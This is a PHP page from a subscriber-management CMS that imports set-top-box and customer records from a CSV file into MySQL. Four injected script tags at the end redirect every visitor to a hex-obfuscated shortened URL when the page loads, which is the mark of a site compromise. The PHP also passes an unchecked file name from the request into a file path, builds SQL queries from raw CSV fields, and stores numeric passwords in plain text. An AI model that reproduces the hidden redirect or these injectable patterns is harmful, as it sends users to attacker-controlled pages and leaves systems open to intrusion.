<?php
require_once("helper.php");
class myCms extends Cms
{
    function registerAjaxFunctions()
    {
    $this->xajax->registerFunction("get_Listing");
    $this->xajax->registerFunction("update_status");
    $this->xajax->registerFunction("deleteRow");
    $this->xajax->registerFunction("editMode");
    $this->xajax->registerFunction("sorting");
    $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$msg        =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id = base64_decode($_GET['id']);
$objMisc = new Cms();
$add = true; 
    
        //if(!empty($_POST['csvfile'])){
        $fileName="uploads/".$_GET['fileName'].".csv";
        if (!$fp = fopen($fileName,"r"))
        echo "Sorry, cannot open the file";
        else
            {       
                while(!feof($fp))   
                {
                    while (($data = fgetcsv($fp, 10000, ",")) !== FALSE) 
                    { 
                        //print_r($data); exit;
                         $fileRow++;    
                        $num = count($data);
                        if ($fileRow <= "1") continue;      // Continue Back Bcz its blank row in the CSV File 
                        
                        //Code For Area

                            $area=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND `NAME`='$data[8]'",'WING_ID','wing_master');
                            if($area=='' && ($data[8]!='' || $data[8]!=0)){
                                $areaArray = array( 'HEADOFFICE_ID'           =>$_SESSION['HEADOFFICE'],
                                                    'NAME'              =>addslashes($data[8]),
                                                    'ADDED_BY'          =>'1',
                                                    'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                    );
                                $insertLang=$objMisc->insert('wing_master',$areaArray);
                                $area=mysql_insert_id();
                            }

                        //Code For Sub Area

                            $subArea=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND WING_ID='$area' AND NAME='$data[9]'",'UNIT_ID','unit_master');
                            if($subArea=='' && ($data[9]!='' || $data[9]!=0)){
                                $subAreaArray = array( 'HEADOFFICE_ID'        =>$_SESSION['HEADOFFICE'],
                                                    'NAME'              =>addslashes($data[9]),
                                                    'WING_ID'           =>$area,
                                                    'ADDED_BY'          =>'1',
                                                    'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                    );
                                $insertSubarea=$objMisc->insert('unit_master',$subAreaArray);
                                $subArea=mysql_insert_id();
                            }

                        //Code For Setup Boxes

                            $subscription=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STB_NO='$data[2]' AND SAF_NO='$data[5]' AND MAC_NO='$data[4]'",'SUBSCRIPTION_ID','subscriptions');
                            if($subscription=='' && ($data[2]!='' || $data[5]!=0)){
                                $subscriptionArray = array( 'HEADOFFICE_ID'          =>$_SESSION['HEADOFFICE'],
                                                            'CARTON_NO'        =>addslashes($data[1]),
                                                            'STB_NO'           =>addslashes($data[2]),
                                                            'VC_NO'            =>addslashes($data[3]),
                                                            'SAF_NO'           =>addslashes($data[5]),
                                                            'MAC_NO'           =>addslashes($data[4]),
                                                            'MODEL'            =>addslashes($data[6]),
                                                            'ADDED_BY'          =>'1',
                                                            'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                            );
                                $insertSubscription=$objMisc->insert('subscriptions',$subscriptionArray);
                                $subscription=mysql_insert_id();
                            }

                            //Code For PACKAGE
                        if($data['4']=='Parents' || $data['4']=='Own Demo'){
                            $amount=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND NAME LIKE '%Gold%'",'PARENT_CHARGES','package_master');
                            $package=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND NAME LIKE '%Gold%'",'PACKAGE_ID','package_master');
                            $type='P';
                        }else{
                            $amount=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND NAME LIKE '%Gold%'",'PARENT_CHARGES','package_master'); 
                            $package=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND NAME LIKE '%Gold%'",'PACKAGE_ID','package_master'); 
                            $type='C';
                        }
                        //Code For Subscriber Insertion
                            $customer_id = $objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY SUBSCRIBER_ID DESC LIMIT 1",'CUSTOMER_ID','subscribers');
                            $mso_id      = $objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY SUBSCRIBER_ID DESC LIMIT 1",'MSO_ID','subscribers');
                            if(empty($customer_id)){
                                $customerId='000001';
                            }else{
                                $customerId=sprintf("%06d", $customer_id+1);
                            }
                            if(empty($mso_id)){
                                $msoId='000001';
                            }else{
                                $msoId=sprintf("%06d", $mso_id+1);
                            }
                            $subscriber=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE_ID]' AND PHONE_NO='$data[16]'",'SUBSCRIBER_ID','subscribers');
                            if(empty($subscriber)){
                                $subscriberArray = array(   'HEADOFFICE_ID'          =>$_SESSION['HEADOFFICE'],
                                                            'NAME'             =>$data[11],
                                                            'PHONE_NO'         =>addslashes($data[16]),
                                                            'PAYMENT_METHOD'   =>'P',
                                                            'RELATIVE'         =>$data[13],
                                                            'RELATION'         =>$data[12],
                                                            'ADDRESS'          =>$data[14],
                                                            'AMOUNT'           =>$amount,
                                                            'UNIT_ID'          =>$subArea,
                                                            'CUSTOMER_ID'      =>$customerId,
                                                            'MSO_ID'           =>$msoId,
                                                            'ADDED_BY'         =>'1',
                                                            'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                            );
                         
                                $insertSubscribers=$objMisc->insert('subscribers',$subscriberArray);
                                $subscriber=mysql_insert_id();
                                $userArray=array('HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                 'USERNAME'         =>$data[16],
                                                 'USER_TYPE'        =>'S',
                                                 'ID'               =>$subscriber,
                                                 'PASSWORD'         =>rand(111111,999999));
                                $insertAsUser=$objMisc->insert('users',$userArray);
                            }else{
                                $amount1=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIBER_ID='$subscriber'",'AMOUNT','subscribers');
                                $amount=$amount+$amount1;
                                $where=" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIBER_ID='$subscriber'";
                                $Array1=array('AMOUNT' =>$amount);
                                $update=$objMisc->update('subscribers',$Array1,$where);
                            }

                        //Code For Setup Box Partition

                            $setupBox=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIPTION_ID='$subscription'",'STB_ID','stb_box');
                            if($setupBox==''){
                                $setupBoxArray = array(     'HEADOFFICE_ID'          =>$_SESSION['HEADOFFICE'],
                                                            'SUBSCRIPTION_ID'  =>$subscription,
                                                            'SUBSCRIBER_ID'    =>$subscriber,
                                                            'PACKAGE_ID'       =>$package,
                                                            'PACKAGE_TYPE'     =>$type,
                                                            'ADDED_BY'         =>'1',
                                                            'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                            );
                                $insertSetupBox=$objMisc->insert('stb_box',$setupBoxArray);
                                $SetupBox=mysql_insert_id();
                            }
                            
                    
                    }
                }
            } 
                
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>